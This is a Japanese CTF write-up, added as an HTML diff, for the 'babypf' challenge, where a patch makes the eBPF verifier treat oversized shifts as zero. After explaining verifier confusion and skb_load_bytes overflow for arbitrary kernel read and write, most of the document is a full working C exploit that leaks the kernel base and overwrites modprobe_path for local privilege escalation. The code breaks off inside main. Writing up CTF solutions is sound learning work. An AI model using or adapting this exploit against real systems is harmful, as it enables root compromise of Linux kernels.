@@ -1,0 +1,380 @@
+<h3 id="babypf">babypf</h3>
+<p>eBPFに脆弱なパッチがあたっている  </p>
+<pre><code>diff --git a<span class="hljs-regexp">/linux-5.19.12/</span>kernel<span class="hljs-regexp">/bpf/</span>verifier.c b<span class="hljs-regexp">/linux-5.19.12-patched/</span>kernel<span class="hljs-regexp">/bpf/</span>verifier.c
+index <span class="hljs-number">3391470611.</span><span class="hljs-number">.44</span>af26055b <span class="hljs-number">100644</span>
+--- a<span class="hljs-regexp">/linux-5.19.12/</span>kernel<span class="hljs-regexp">/bpf/</span>verifier.c
++++ b<span class="hljs-regexp">/linux-5.19.12-patched/</span>kernel<span class="hljs-regexp">/bpf/</span>verifier.c
+@@ <span class="hljs-number">-8925</span>,<span class="hljs-number">10</span> +<span class="hljs-number">8925</span>,<span class="hljs-number">8</span> @@ <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
+                <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> <span class="hljs-string">BPF_LSH:</span>
+                <span class="hljs-keyword">if</span> (umax_val &gt;= insn_bitness) {
+-                       <span class="hljs-comment">/* Shifts greater than 31 or 63 are undefined.
+-                        * This includes shifts by a negative number.
+-                        */</span>
+-                       mark_reg_unknown(env, regs, insn-&gt;dst_reg);
++                       <span class="hljs-comment">/* Shifts greater than 31 or 63 results in 0. */</span>
++                       mark_reg_known_zero(env, regs, insn-&gt;dst_reg);
+                        <span class="hljs-keyword">break</span>;
+                }
+                <span class="hljs-keyword">if</span> (alu32)
+@@ <span class="hljs-number">-8938</span>,<span class="hljs-number">9</span> +<span class="hljs-number">8936</span>,<span class="hljs-number">7</span> @@ <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
+                <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> <span class="hljs-string">BPF_RSH:</span>
+                <span class="hljs-keyword">if</span> (umax_val &gt;= insn_bitness) {
+-                       <span class="hljs-comment">/* Shifts greater than 31 or 63 are undefined.
+-                        * This includes shifts by a negative number.
+-                        */</span>
+-                       mark_reg_unknown(env, regs, insn-&gt;dst_reg);
++                       <span class="hljs-comment">/* Shifts greater than 31 or 63 results in 0. */</span>
++                       mark_reg_known_zero(env, regs, insn-&gt;dst_reg);
+                        <span class="hljs-keyword">break</span>;
+                }
+                <span class="hljs-keyword">if</span> (alu32)
+</code></pre><p>シフト演算にでbit長を超えるシフト演算をすると検証器はその値を未定義(unknown)にするところを
+定数0にしている。
+これをどうやってLPEするか</p>
+<p>自分は開催前に作問者yudaiさん作の<a href="https://pawnyable.cafe/">pawnyable</a>を履修していたので
+やることは大体わかった。  </p>
+<p>最終的なcのexploitコードもこの演習で使ったものの流用なのでヘルパーとかかなり酷似しているがご勘弁いただきたい
+というか以下の解説もほぼpawnyableの受け売りでしたわ</p>
+<h4 id="-">脆弱なコードの実行</h4>
+<p>まずは脆弱なコードを実行させるところだが</p>
+<p>即値で演算をしてみる</p>
+<pre><code>    <span class="hljs-keyword">BPF_ALU32_IMM(BPF_RSH, </span><span class="hljs-keyword">BPF_REG_8, </span><span class="hljs-number">32</span>),
+    <span class="hljs-keyword">BPF_ALU64_IMM(BPF_RSH, </span><span class="hljs-keyword">BPF_REG_8, </span><span class="hljs-number">64</span>),
+</code></pre><p>みたいなことをすると検証器に怒られたので
+レジスタを経由してみる</p>
+<pre><code>        <span class="hljs-keyword">BPF_MOV64_IMM(BPF_REG_4, </span><span class="hljs-number">32</span>),
+        <span class="hljs-keyword">BPF_ALU32_REG(BPF_LSH, </span><span class="hljs-keyword">BPF_REG_8, </span><span class="hljs-keyword">BPF_REG_4),</span>
+</code></pre><p>検証器のログをチェックするとちゃんと定数になっている</p>
+<blockquote>
+<p>22: (6c) w8 &lt;&lt;= w4                    ; R4_w=32 R8_w=0</p>
+</blockquote>
+<p>ちなみにパッチがあたっていないとちゃんと未定義になる</p>
+<blockquote>
+<p>22: (6c) w8 &lt;&lt;= w4                    ; R4_w=32 R8_w=scalar(umax=4294967295,var_off=(0x0; 0xffffffff))</p>
+</blockquote>
+<h4 id="0-1-">0と1を誤認させる</h4>
+<p>検証器の悪用するにあたってこれが大事らしい
+32bitレジスタで1を32bit LSHすると1になるのでこれは簡単に作れる
+ちなみにパッチのコメントにある通り負数でもこれは作れて(-1)bitシフトしても壊れてくれる</p>
+<p>検証器が0と思っているが実際は1みたいな状況を作れると
+乗算すると、任意の値を検証器は0と勘違いしてくれる</p>
+<h4 id="skb_load_bytes-aar-aaw">skb_load_bytesを利用したAAR/AAW</h4>
+<p>詳しくは<a href="https://pawnyable.cafe/linux-kernel/LK06/exploit.html">pawnyable 6章</a>も書いているが
+skb_load_bytesを利用してoverflowを引き起こすことができる。
+検証器は1byteの書き込みだから許すけど本当は9bytes書き込むよ的な感じ</p>
+<p>もう一つ大事なことでBPFスタックにはポインタを保存できて
+かつその値の追跡も行ってくれる。(完全な受け売り)
+そのためBPFスタックに定数を保存したBPFスタックのアドレスを格納して、
+skb_load_bytesのオーバーフローでアドレスの下位1bytesを書き換えても
+検証器はまだそこに定数を保存したアドレスがあると勘違いするので
+AARが作れる。</p>
+<p>以下のダンプはこれを利用してBPFスタック周辺をリークしてみた様子</p>
+<pre><code><span class="hljs-attribute">0x000</span>: ffffffffb3d4fdf5
+<span class="hljs-attribute">0x008</span>: ffff97adc36b6600
+<span class="hljs-attribute">0x010</span>: 00000000b4000c67
+<span class="hljs-attribute">0x018</span>: 0000000000400cc0
+<span class="hljs-attribute">0x020</span>: ffffac53c018fcd8
+<span class="hljs-attribute">0x028</span>: 0000000000000000
+<span class="hljs-attribute">0x030</span>: ffff97adc3754400
+<span class="hljs-attribute">0x038</span>: ffffffffb3accc09
+<span class="hljs-attribute">0x040</span>: ffffac53c018fdd8
+<span class="hljs-attribute">0x048</span>: ffffffffb3d91b3b
+<span class="hljs-attribute">0x050</span>: ffff97adc3754800
+<span class="hljs-attribute">0x058</span>: ffff97adc3767700
+<span class="hljs-attribute">0x060</span>: ffffac53c018fcb0
+<span class="hljs-attribute">0x068</span>: ffffffffc034b725
+<span class="hljs-attribute">0x070</span>: ffffac53c0095000
+<span class="hljs-attribute">0x078</span>: ffff97adc3754400
+<span class="hljs-attribute">0x080</span>: 0000000000000001
+<span class="hljs-attribute">0x088</span>: 0000000000000001
+<span class="hljs-attribute">0x090</span>: 4141414141414141
+<span class="hljs-attribute">0x098</span>: ffffac53c018fc98
+<span class="hljs-attribute">0x0a0</span>: 0000000000000000
+<span class="hljs-attribute">0x0a8</span>: 0000000000000000
+<span class="hljs-attribute">0x0b0</span>: ffffac53c018fd10
+<span class="hljs-attribute">0x0b8</span>: ffffffffb3d8babf
+<span class="hljs-attribute">0x0c0</span>: ffffac53c018fd10
+<span class="hljs-attribute">0x0c8</span>: ffffffffb3d5839d
+<span class="hljs-attribute">0x0d0</span>: 0000000000000282
+<span class="hljs-attribute">0x0d8</span>: ffff97adc3767700
+<span class="hljs-attribute">0x0e0</span>: 0000000000000009
+<span class="hljs-attribute">0x0e8</span>: ffffac53c018fdc8
+<span class="hljs-attribute">0x0f0</span>: ffff97adc3754800
+<span class="hljs-attribute">0x0f8</span>: ffff97adc3754400
+</code></pre><p>オフセット0x90をoverflowさせてオフセット0x98のポインタを壊している
+オフセット0xb8とかはカーネルのアドレスっぽいのでここからカーネルのベースアドレスを特定する。</p>
+<p>AAWも同じ原理で、検証器はスタックのアドレスだと思っている値を任意のアドレスにすることで
+AAWが作れる。exploitではmodprobe_pathを利用した</p>
+<h4 id="exploit">exploit</h4>
+<pre><code class="lang-c"><span class="hljs-symbol">#include</span> &lt;linux/<span class="hljs-keyword">bpf.h&gt;
+</span><span class="hljs-symbol">#include</span> &lt;stdint.h&gt;
+<span class="hljs-symbol">#include</span> &lt;stdio.h&gt;
+<span class="hljs-symbol">#include</span> &lt;stdlib.h&gt;
+<span class="hljs-symbol">#include</span> &lt;sys/socket.h&gt;
+<span class="hljs-symbol">#include</span> &lt;sys/syscall.h&gt;
+<span class="hljs-symbol">#include</span> &lt;sys/types.h&gt;
+<span class="hljs-symbol">#include</span> &lt;unistd.h&gt;
+<span class="hljs-symbol">#include</span> <span class="hljs-string">"bpf_insn.h"</span>
+
+<span class="hljs-symbol">unsigned</span> long kernel_base = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
+<span class="hljs-symbol">unsigned</span> long <span class="hljs-keyword">addr_heap </span>= <span class="hljs-number">0</span><span class="hljs-comment">;</span>
+
+<span class="hljs-symbol">unsigned</span> long off_target   = <span class="hljs-number">0xffffffffb298babf</span> - <span class="hljs-number">0xffffffffb2400000</span><span class="hljs-comment">;</span>
+<span class="hljs-symbol">unsigned</span> long off_modprobe = <span class="hljs-number">0xffffffffbd238340</span> - <span class="hljs-number">0xffffffffbc400000</span><span class="hljs-comment">;</span>
+
+<span class="hljs-symbol">void</span> fatal(const char *msg) 
+{
+    perror(msg)<span class="hljs-comment">;</span>
+    exit(<span class="hljs-number">1</span>)<span class="hljs-comment">;</span>
+}
+
+<span class="hljs-symbol">int</span> <span class="hljs-keyword">bpf(int </span>cmd, union <span class="hljs-keyword">bpf_attr </span>*attrs) 
+{
+    return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs))<span class="hljs-comment">;</span>
+}
+
+<span class="hljs-symbol">int</span> map_create(int val_size, int max_entries)
+{
+    union <span class="hljs-keyword">bpf_attr </span><span class="hljs-meta">attr</span> = {
+        .map_type = <span class="hljs-keyword">BPF_MAP_TYPE_ARRAY,
+</span>        .key_size = sizeof(int),
+        .value_size = val_size,
+        .max_entries = max_entries
+    }<span class="hljs-comment">;</span>
+    int mapfd = <span class="hljs-keyword">bpf(BPF_MAP_CREATE, </span>&amp;<span class="hljs-meta">attr</span>)<span class="hljs-comment">;</span>
+    <span class="hljs-meta">if</span>(mapfd &lt; <span class="hljs-number">0</span>) fatal(<span class="hljs-string">"bpf(BPF_MAP_CREATE)"</span>)<span class="hljs-comment">;</span>
+    return mapfd<span class="hljs-comment">;</span>
+}
+
+<span class="hljs-symbol">int</span> map_update(int mapfd, int key, void* pval) {
+    union <span class="hljs-keyword">bpf_attr </span><span class="hljs-meta">attr</span> = {
+        .map_fd = mapfd,
+        .key = (uint64_t)&amp;key,
+        .value = (uint64_t)pval,
+        .flags = <span class="hljs-keyword">BPF_ANY
+</span>    }<span class="hljs-comment">;</span>
+
+    int res = <span class="hljs-keyword">bpf(BPF_MAP_UPDATE_ELEM, </span>&amp;<span class="hljs-meta">attr</span>)<span class="hljs-comment">;</span>
+    <span class="hljs-meta">if</span>(res &lt; <span class="hljs-number">0</span>) fatal(<span class="hljs-string">"bpf(BPF_MAP_UPDATE_ELEM)"</span>)<span class="hljs-comment">;</span>
+    return res<span class="hljs-comment">;</span>
+}
+
+<span class="hljs-symbol">int</span> map_lookup(int mapfd, int key, void *pval)
+{
+    union <span class="hljs-keyword">bpf_attr </span><span class="hljs-meta">attr</span> = {
+        .map_fd = mapfd,
+        .key = (uint64_t)&amp;key,
+        .value = (uint64_t)pval,
+        .flags = <span class="hljs-keyword">BPF_ANY
+</span>    }<span class="hljs-comment">;</span>
+
+    return <span class="hljs-keyword">bpf(BPF_MAP_LOOKUP_ELEM, </span>&amp;<span class="hljs-meta">attr</span>)<span class="hljs-comment">;</span>
+}
+
+<span class="hljs-symbol">unsigned</span> long leak_address(int mapfd) {
+    char verifier_log[<span class="hljs-number">0x10000</span>]<span class="hljs-comment">;</span>
+    unsigned long val<span class="hljs-comment">;</span>
+
+    <span class="hljs-keyword">struct </span><span class="hljs-keyword">bpf_insn </span>insns[] = {
+        <span class="hljs-keyword">BPF_MOV64_REG(BPF_REG_7, </span><span class="hljs-keyword">BPF_REG_ARG1),
+</span>        <span class="hljs-keyword">BPF_ST_MEM(BPF_DW, </span><span class="hljs-keyword">BPF_REG_FP, </span>-<span class="hljs-number">0x8</span>, <span class="hljs-number">0</span>), // fp_x8 key<span class="hljs-number">=0</span>
+        <span class="hljs-keyword">BPF_LD_MAP_FD(BPF_REG_ARG1, </span>mapfd),
+        <span class="hljs-keyword">BPF_MOV64_REG(BPF_REG_ARG2, </span><span class="hljs-keyword">BPF_REG_FP),
+</span>        <span class="hljs-keyword">BPF_ALU64_IMM(BPF_ADD, </span><span class="hljs-keyword">BPF_REG_ARG2, </span>-<span class="hljs-number">8</span>),
+        <span class="hljs-keyword">BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), </span>// map_lookup_elem(mapfd, &amp;key)
+        <span class="hljs-keyword">BPF_JMP_IMM(BPF_JNE, </span><span class="hljs-keyword">BPF_REG_0, </span><span class="hljs-number">0</span>, <span class="hljs-number">1</span>),
+        <span class="hljs-keyword">BPF_EXIT_INSN(),
+</span>
+        <span class="hljs-keyword">BPF_MOV64_REG(BPF_REG_9, </span><span class="hljs-keyword">BPF_REG_0),
+</span>        <span class="hljs-keyword">BPF_LDX_MEM(BPF_DW, </span><span class="hljs-keyword">BPF_REG_8, </span><span class="hljs-keyword">BPF_REG_9, </span><span class="hljs-number">0</span>),
+
+        <span class="hljs-keyword">BPF_MOV64_IMM(BPF_REG_4, </span>-<span class="hljs-number">1</span>),
+
+        // <span class="hljs-built_in">r8</span> = <span class="hljs-number">0</span> / real <span class="hljs-number">1</span>
+        <span class="hljs-keyword">BPF_ALU32_REG(BPF_LSH, </span><span class="hljs-keyword">BPF_REG_8, </span><span class="hljs-keyword">BPF_REG_4),
+</span>        <span class="hljs-keyword">BPF_ALU64_IMM(BPF_RSH, </span><span class="hljs-keyword">BPF_REG_8, </span><span class="hljs-number">31</span>),
+
+        // <span class="hljs-built_in">r8</span> = <span class="hljs-number">1</span> / real <span class="hljs-number">0x10</span>
+        <span class="hljs-keyword">BPF_ALU64_IMM(BPF_MUL, </span><span class="hljs-keyword">BPF_REG_8, </span><span class="hljs-number">0x9</span>-<span class="hljs-number">1</span>),
+        <span class="hljs-keyword">BPF_ALU64_IMM(BPF_ADD, </span><span class="hljs-keyword">BPF_REG_8, </span><span class="hljs-number">0x1</span>),
+
+        <span class="hljs-keyword">BPF_MOV64_IMM(BPF_REG_3, </span><span class="hljs-number">1</span>),
+        <span class="hljs-keyword">BPF_STX_MEM(BPF_DW, </span><span class="hljs-keyword">BPF_REG_FP, </span><span class="hljs-keyword">BPF_REG_3, </span>-<span class="hljs-number">0x28</span>),
+        <span class="hljs-keyword">BPF_MOV64_REG(BPF_REG_3, </span><span class="hljs-keyword">BPF_REG_FP),
+</span>        <span class="hljs-keyword">BPF_ALU64_IMM(BPF_ADD, </span><span class="hljs-keyword">BPF_REG_3, </span>-<span class="hljs-number">0x28</span>),
+        <span class="hljs-keyword">BPF_STX_MEM(BPF_DW, </span><span class="hljs-keyword">BPF_REG_FP, </span><span class="hljs-keyword">BPF_REG_3, </span>-<span class="hljs-number">0x18</span>),
+        <span class="hljs-keyword">BPF_MOV64_REG(BPF_REG_ARG3, </span><span class="hljs-keyword">BPF_REG_FP), </span>           
+        <span class="hljs-keyword">BPF_ALU64_IMM(BPF_ADD, </span><span class="hljs-keyword">BPF_REG_ARG3, </span>-<span class="hljs-number">0x20</span>),        // arg4 = <span class="hljs-built_in">fp</span>-<span class="hljs-number">0x20</span>
+
+        <span class="hljs-keyword">BPF_MOV64_IMM(BPF_REG_ARG2, </span><span class="hljs-number">0</span>),
+        <span class="hljs-keyword">BPF_MOV64_REG(BPF_REG_ARG4, </span><span class="hljs-keyword">BPF_REG_8),
+</span>        <span class="hljs-keyword">BPF_MOV64_REG(BPF_REG_ARG1, </span><span class="hljs-keyword">BPF_REG_7),
+</span>        <span class="hljs-keyword">BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),
+</span>
+        <span class="hljs-keyword">BPF_LDX_MEM(BPF_DW, </span><span class="hljs-keyword">BPF_REG_9, </span><span class="hljs-keyword">BPF_REG_FP, </span>-<span class="hljs-number">0x18</span>),
+        <span class="hljs-keyword">BPF_LDX_MEM(BPF_DW, </span><span class="hljs-keyword">BPF_REG_8, </span><span class="hljs-keyword">BPF_REG_9, </span><span class="hljs-number">0</span>),
+
+        // map_update_elem    
+        <span class="hljs-keyword">BPF_ST_MEM(BPF_DW, </span><span class="hljs-keyword">BPF_REG_FP, </span>-<span class="hljs-number">0x8</span>, <span class="hljs-number">0</span>),             // [<span class="hljs-built_in">fp</span>-<span class="hljs-number">0x8</span>]<span class="hljs-number">=0</span>(key)
+
+        <span class="hljs-keyword">BPF_STX_MEM(BPF_DW, </span><span class="hljs-keyword">BPF_REG_FP, </span><span class="hljs-keyword">BPF_REG_8, </span>-<span class="hljs-number">0x10</span>),    // [<span class="hljs-built_in">fp</span>-<span class="hljs-number">0x10</span>]<span class="hljs-symbol">=r2</span>
+        <span class="hljs-keyword">BPF_LD_MAP_FD(BPF_REG_ARG1, </span>mapfd),                    // arg1 = mapfd
+        <span class="hljs-keyword">BPF_MOV64_REG(BPF_REG_ARG2, </span><span class="hljs-keyword">BPF_REG_FP),
+</span>        <span class="hljs-keyword">BPF_ALU64_IMM(BPF_ADD, </span><span class="hljs-keyword">BPF_REG_ARG2, </span>-<span class="hljs-number">0x8</span>),            // arg2 = <span class="hljs-built_in">fp</span>-<span class="hljs-number">0x8</span>
+        <span class="hljs-keyword">BPF_MOV64_REG(BPF_REG_ARG3, </span><span class="hljs-keyword">BPF_REG_FP),
+</span>        <span class="hljs-keyword">BPF_ALU64_IMM(BPF_ADD, </span><span class="hljs-keyword">BPF_REG_ARG3, </span>-<span class="hljs-number">0x10</span>),        // arg3 = <span class="hljs-built_in">fp</span><span class="hljs-number">=010</span>
+        <span class="hljs-keyword">BPF_MOV64_IMM(BPF_REG_ARG4, </span><span class="hljs-number">0</span>),
+        <span class="hljs-keyword">BPF_EMIT_CALL(BPF_FUNC_map_update_elem),
+</span>
+        <span class="hljs-keyword">BPF_MOV64_IMM(BPF_REG_0, </span><span class="hljs-number">0</span>),
+        <span class="hljs-keyword">BPF_EXIT_INSN(),
+</span>    }<span class="hljs-comment">;</span>
+
+    union <span class="hljs-keyword">bpf_attr </span>prog_attr = {
+        .prog_type = <span class="hljs-keyword">BPF_PROG_TYPE_SOCKET_FILTER,
+</span>        .insn_cnt = sizeof(insns) / sizeof(insns[<span class="hljs-number">0</span>]),
+        .insns = (uint64_t) insns,
+        .license = (uint64_t)<span class="hljs-string">"GPL v2"</span>,
+        .log_level = <span class="hljs-number">2</span>,
+        .log_size = sizeof(verifier_log),
+        .log_buf = (uint64_t)verifier_log,
+    }<span class="hljs-comment">;</span>
+
+    int progfd = <span class="hljs-keyword">bpf(BPF_PROG_LOAD, </span>&amp;prog_attr)<span class="hljs-comment">;</span>
+    <span class="hljs-meta">if</span> (progfd == -<span class="hljs-number">1</span>) {
+        printf(<span class="hljs-string">"%s\n"</span>, verifier_log)<span class="hljs-comment">;</span>
+        fatal(<span class="hljs-string">"bpf(BPF_PROG_LOAD)"</span>)<span class="hljs-comment">;</span>
+    }
+    printf(<span class="hljs-string">"%s\n"</span>, verifier_log)<span class="hljs-comment">;</span>
+
+    int socks[<span class="hljs-number">2</span>]<span class="hljs-comment">;</span>
+    <span class="hljs-meta">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, <span class="hljs-number">0</span>, socks))
+        fatal(<span class="hljs-string">"socketpair"</span>)<span class="hljs-comment">;</span>
+    <span class="hljs-meta">if</span>(setsockopt(socks[<span class="hljs-number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(int)))
+        fatal(<span class="hljs-string">"setsockopt"</span>)<span class="hljs-comment">;</span>
+
+
+    int i<span class="hljs-comment">;</span>
+    char payload[<span class="hljs-number">0x10</span>]<span class="hljs-comment">;</span>
+    *(unsigned long*)&amp;payload[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4141414141414141</span><span class="hljs-comment">;</span>
+    for(i = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 0x100; i+=8) {</span>
+        val = <span class="hljs-number">1</span><span class="hljs-comment">;    </span>
+        map_update(mapfd, <span class="hljs-number">0</span>, &amp;val)<span class="hljs-comment">;</span>
+        payload[<span class="hljs-number">0x8</span>] = i<span class="hljs-comment">;</span>
+        write(socks[<span class="hljs-number">1</span>], payload, <span class="hljs-number">0x9</span>)<span class="hljs-comment">;</span>
+        map_lookup(mapfd, <span class="hljs-number">0</span>, &amp;val)<span class="hljs-comment">;</span>
+
+        printf(<span class="hljs-string">"0x%03lx: %016llx\n"</span>, i, val)<span class="hljs-comment">;</span>
+        <span class="hljs-meta">if</span>(i == <span class="hljs-number">0xb8</span>)
+            kernel_base = val - off_target<span class="hljs-comment">;    </span>
+    }
+    printf(<span class="hljs-string">"kbase = %016llx\n"</span>, kernel_base)<span class="hljs-comment">;</span>
+    return val<span class="hljs-comment">;</span>
+}
+
+<span class="hljs-symbol">void</span> aaw64(int mapfd, unsigned long <span class="hljs-keyword">addr, </span>unsigned long <span class="hljs-meta">data</span>) {
+    char verifier_log[<span class="hljs-number">0x10000</span>]<span class="hljs-comment">;</span>
+    unsigned long val<span class="hljs-comment">;</span>
+
+    <span class="hljs-keyword">struct </span><span class="hljs-keyword">bpf_insn </span>insns[] = {
+        <span class="hljs-keyword">BPF_MOV64_REG(BPF_REG_7, </span><span class="hljs-keyword">BPF_REG_ARG1),
+</span>        <span class="hljs-keyword">BPF_ST_MEM(BPF_DW, </span><span class="hljs-keyword">BPF_REG_FP, </span>-<span class="hljs-number">0x8</span>, <span class="hljs-number">0</span>), // fp_x8 key<span class="hljs-number">=0</span>
+        <span class="hljs-keyword">BPF_LD_MAP_FD(BPF_REG_ARG1, </span>mapfd),
+        <span class="hljs-keyword">BPF_MOV64_REG(BPF_REG_ARG2, </span><span class="hljs-keyword">BPF_REG_FP),
+</span>        <span class="hljs-keyword">BPF_ALU64_IMM(BPF_ADD, </span><span class="hljs-keyword">BPF_REG_ARG2, </span>-<span class="hljs-number">8</span>),
+        <span class="hljs-keyword">BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), </span>// map_lookup_elem(mapfd, &amp;key)
+        <span class="hljs-keyword">BPF_JMP_IMM(BPF_JNE, </span><span class="hljs-keyword">BPF_REG_0, </span><span class="hljs-number">0</span>, <span class="hljs-number">1</span>),
+        <span class="hljs-keyword">BPF_EXIT_INSN(),
+</span>
+        <span class="hljs-keyword">BPF_MOV64_REG(BPF_REG_9, </span><span class="hljs-keyword">BPF_REG_0), </span>           // <span class="hljs-built_in">r9</span> = mapaddr
+        <span class="hljs-keyword">BPF_LDX_MEM(BPF_DW, </span><span class="hljs-keyword">BPF_REG_8, </span><span class="hljs-keyword">BPF_REG_9, </span><span class="hljs-number">0</span>),     // <span class="hljs-built_in">r8</span> = &amp;<span class="hljs-meta">map</span>[<span class="hljs-number">0</span>]
+
+        <span class="hljs-keyword">BPF_MOV64_IMM(BPF_REG_4, </span>-<span class="hljs-number">1</span>),
+
+        // <span class="hljs-built_in">r8</span> = <span class="hljs-number">0</span> / real <span class="hljs-number">1</span>
+        <span class="hljs-keyword">BPF_ALU32_REG(BPF_LSH, </span><span class="hljs-keyword">BPF_REG_8, </span><span class="hljs-keyword">BPF_REG_4),
+</span>        <span class="hljs-keyword">BPF_ALU64_IMM(BPF_RSH, </span><span class="hljs-keyword">BPF_REG_8, </span><span class="hljs-number">31</span>),
+
+        // <span class="hljs-built_in">r8</span> = <span class="hljs-number">1</span> / real <span class="hljs-number">0x10</span>
+        <span class="hljs-keyword">BPF_ALU64_IMM(BPF_MUL, </span><span class="hljs-keyword">BPF_REG_8, </span><span class="hljs-number">0x10</span>-<span class="hljs-number">1</span>),
+        <span class="hljs-keyword">BPF_ALU64_IMM(BPF_ADD, </span><span class="hljs-keyword">BPF_REG_8, </span><span class="hljs-number">0x1</span>),
+
+
+        <span class="hljs-keyword">BPF_STX_MEM(BPF_DW, </span><span class="hljs-keyword">BPF_REG_FP, </span><span class="hljs-keyword">BPF_REG_9, </span>-<span class="hljs-number">0x18</span>),        // [<span class="hljs-built_in">fp</span>-<span class="hljs-number">0x18</span>] = mapaddr
+        <span class="hljs-keyword">BPF_MOV64_REG(BPF_REG_ARG3, </span><span class="hljs-keyword">BPF_REG_FP), </span>           
+        <span class="hljs-keyword">BPF_ALU64_IMM(BPF_ADD, </span><span class="hljs-keyword">BPF_REG_ARG3, </span>-<span class="hljs-number">0x20</span>),        // arg3 = <span class="hljs-built_in">fp</span>-<span class="hljs-number">0x20</span>
+
+        <span class="hljs-keyword">BPF_MOV64_IMM(BPF_REG_ARG2, </span><span class="hljs-number">0</span>),                        // arg2 = <span class="hljs-number">0</span>
+        <span class="hljs-keyword">BPF_MOV64_REG(BPF_REG_ARG4, </span><span class="hljs-keyword">BPF_REG_8), </span>               // arg4 = len(<span class="hljs-number">1</span>/<span class="hljs-number">0x10</span>)
+        <span class="hljs-keyword">BPF_MOV64_REG(BPF_REG_ARG1, </span><span class="hljs-keyword">BPF_REG_7), </span>               // arg1 = skb
+        <span class="hljs-keyword">BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),
+</span>
+        <span class="hljs-keyword">BPF_LDX_MEM(BPF_DW, </span><span class="hljs-keyword">BPF_REG_9, </span><span class="hljs-keyword">BPF_REG_FP, </span>-<span class="hljs-number">0x18</span>),    // <span class="hljs-built_in">r9</span> = [<span class="hljs-built_in">fp</span>-<span class="hljs-number">0x18</span>]
+
+        <span class="hljs-keyword">BPF_MOV64_IMM(BPF_REG_1, </span><span class="hljs-meta">data</span> &gt;&gt; <span class="hljs-number">32</span>),
+        <span class="hljs-keyword">BPF_ALU64_IMM(BPF_LSH, </span><span class="hljs-keyword">BPF_REG_1, </span><span class="hljs-number">32</span>),
+        <span class="hljs-keyword">BPF_ALU64_IMM(BPF_ADD, </span><span class="hljs-keyword">BPF_REG_1, </span><span class="hljs-meta">data</span> &amp; <span class="hljs-number">0xffffffff</span>),
+        <span class="hljs-keyword">BPF_STX_MEM(BPF_DW, </span><span class="hljs-keyword">BPF_REG_9, </span><span class="hljs-keyword">BPF_REG_1, </span><span class="hljs-number">0</span>),             // [<span class="hljs-built_in">fp</span>-<span class="hljs-number">0x28</span>] = <span class="hljs-meta">data</span>
+
+        <span class="hljs-keyword">BPF_MOV64_IMM(BPF_REG_0, </span><span class="hljs-number">0</span>),
+        <span class="hljs-keyword">BPF_EXIT_INSN(),
+</span>    }<span class="hljs-comment">;</span>
+
+    union <span class="hljs-keyword">bpf_attr </span>prog_attr = {
+        .prog_type = <span class="hljs-keyword">BPF_PROG_TYPE_SOCKET_FILTER,
+</span>        .insn_cnt = sizeof(insns) / sizeof(insns[<span class="hljs-number">0</span>]),
+        .insns = (uint64_t) insns,
+        .license = (uint64_t)<span class="hljs-string">"GPL v2"</span>,
+        .log_level = <span class="hljs-number">2</span>,
+        .log_size = sizeof(verifier_log),
+        .log_buf = (uint64_t)verifier_log,
+    }<span class="hljs-comment">;</span>
+
+    int progfd = <span class="hljs-keyword">bpf(BPF_PROG_LOAD, </span>&amp;prog_attr)<span class="hljs-comment">;</span>
+    <span class="hljs-meta">if</span> (progfd == -<span class="hljs-number">1</span>) {
+        printf(<span class="hljs-string">"%s\n"</span>, verifier_log)<span class="hljs-comment">;</span>
+        fatal(<span class="hljs-string">"bpf(BPF_PROG_LOAD)"</span>)<span class="hljs-comment">;</span>
+    }
+    printf(<span class="hljs-string">"%s\n"</span>, verifier_log)<span class="hljs-comment">;</span>
+
+    int socks[<span class="hljs-number">2</span>]<span class="hljs-comment">;</span>
+    <span class="hljs-meta">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, <span class="hljs-number">0</span>, socks))
+        fatal(<span class="hljs-string">"socketpair"</span>)<span class="hljs-comment">;</span>
+    <span class="hljs-meta">if</span>(setsockopt(socks[<span class="hljs-number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(int)))
+        fatal(<span class="hljs-string">"setsockopt"</span>)<span class="hljs-comment">;</span>
+
+    int i<span class="hljs-comment">;</span>
+    char payload[<span class="hljs-number">0x10</span>]<span class="hljs-comment">;</span>
+    *(unsigned long*)&amp;payload[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4141414141414141</span><span class="hljs-comment">;</span>
+    *(unsigned long*)&amp;payload[<span class="hljs-number">8</span>] = <span class="hljs-keyword">addr;
+</span>    val = <span class="hljs-number">1</span><span class="hljs-comment">;    </span>
+    map_update(mapfd, <span class="hljs-number">0</span>, &amp;val)<span class="hljs-comment">;</span>
+    write(socks[<span class="hljs-number">1</span>], payload, <span class="hljs-number">0x10</span>)<span class="hljs-comment">;</span>
+    map_lookup(mapfd, <span class="hljs-number">0</span>, &amp;val)<span class="hljs-comment">;</span>
+    printf(<span class="hljs-string">"target = 0x%016llx\n"</span>, <span class="hljs-keyword">addr);
+</span>    //read(socks[<span class="hljs-number">0</span>], payload, <span class="hljs-number">0x10</span>)<span class="hljs-comment">;</span>
+}
+
+
+<span class="hljs-symbol">int</span> main()
+{
+    int mapfd = map_create(<span class="hljs-number">0x8</span>, <span class="hljs-number">2</span>)<span class="hljs-comment">;</span>
+    int socks[<span class="hljs-number">2</span>]<span class="hljs-comment">;</span>
+    unsigned long d = <span class="hljs-number">0x6d6b2f706d742f</span><span class="hljs-comment">; // /tmp/km    </span>
+    leak_address(mapfd)<span class="hljs-comment">;</span>
+    aaw64(mapfd, kernel_base+off_modprobe, d)<span class="hljs-comment">;</span>
+
+    // after overwrite modprobe_path
+    system(<span class="hljs-string">"touch /tmp/flag"</span>)<span class="hljs-comment">;</span>
